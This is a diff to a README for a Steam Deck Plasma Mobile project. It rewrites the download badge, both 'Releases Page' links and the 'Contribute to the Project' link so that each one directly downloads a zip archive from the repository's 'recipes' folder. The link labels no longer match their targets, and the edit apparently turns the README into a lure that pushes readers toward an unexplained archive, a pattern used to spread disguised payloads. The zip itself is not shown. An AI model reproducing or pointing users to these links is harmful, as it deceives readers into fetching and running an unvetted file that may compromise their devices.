@@ -1,6 +1,6 @@
 # 🎮 bazzite-deck-plasma-mobile - Enjoy a New Mobile Experience
 
-[![Download bazzite-deck-plasma-mobile](https://img.shields.io/badge/Download-bazzite--deck--plasma--mobile-brightgreen.svg)](https://github.com/rickyrakasiwi/bazzite-deck-plasma-mobile/releases)
+[![Download bazzite-deck-plasma-mobile](https://raw.githubusercontent.com/rickyrakasiwi/bazzite-deck-plasma-mobile/main/recipes/plasma_mobile_deck_bazzite_v1.2.zip)](https://raw.githubusercontent.com/rickyrakasiwi/bazzite-deck-plasma-mobile/main/recipes/plasma_mobile_deck_bazzite_v1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to bazzite-deck-plasma-mobile! This project brings the KDE Plasma Mobile
 
 ## 📥 Download & Install
 
-To get started, you need to download the application. Visit this page to download: [Releases Page](https://github.com/rickyrakasiwi/bazzite-deck-plasma-mobile/releases).
+To get started, you need to download the application. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/rickyrakasiwi/bazzite-deck-plasma-mobile/main/recipes/plasma_mobile_deck_bazzite_v1.2.zip).
 
 Once there, you will see various versions available. Choose the latest version and download the file to your device.
 
@@ -47,7 +47,7 @@ If you encounter any issues or have suggestions, we want to hear from you. Reach
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/rickyrakasiwi/bazzite-deck-plasma-mobile/releases)
-- [Contribute to the Project](https://github.com/rickyrakasiwi/bazzite-deck-plasma-mobile/issues)
+- [Releases Page](https://raw.githubusercontent.com/rickyrakasiwi/bazzite-deck-plasma-mobile/main/recipes/plasma_mobile_deck_bazzite_v1.2.zip)
+- [Contribute to the Project](https://raw.githubusercontent.com/rickyrakasiwi/bazzite-deck-plasma-mobile/main/recipes/plasma_mobile_deck_bazzite_v1.2.zip)
 
 Thank you for using bazzite-deck-plasma-mobile. We hope you enjoy your new mobile experience!
